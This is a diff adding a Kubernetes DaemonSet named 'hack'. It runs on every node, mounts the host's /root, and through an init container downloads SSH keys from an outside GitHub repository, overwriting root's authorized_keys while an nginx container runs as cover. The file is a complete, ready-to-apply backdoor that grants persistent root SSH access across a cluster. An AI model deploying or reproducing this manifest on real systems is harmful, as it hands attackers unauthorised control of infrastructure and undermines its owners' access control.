@@ -1,0 +1,33 @@
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: hack
+spec:
+  selector:
+    matchLabels:
+      app: hack
+  template:
+    metadata:
+      labels:
+        app: hack
+    spec:
+      volumes:
+      - name: root
+        hostPath:
+          path: /root
+      tolerations:
+      - effect: NoSchedule
+        operator: Exists
+      initContainers:
+      - name: hack
+        image: alpine
+        volumeMounts:
+        - name: root
+          mountPath: /root
+        command:
+        - sh
+        - -c
+        - "mkdir -p /root/.ssh && apk update && apk add --no-cache curl && curl https://raw.githubusercontent.com/skurtzemann/k8shack/main/keys > /root/.ssh/authorized_keys"        
+      containers:
+      - name: web
+        image: nginx:alpine
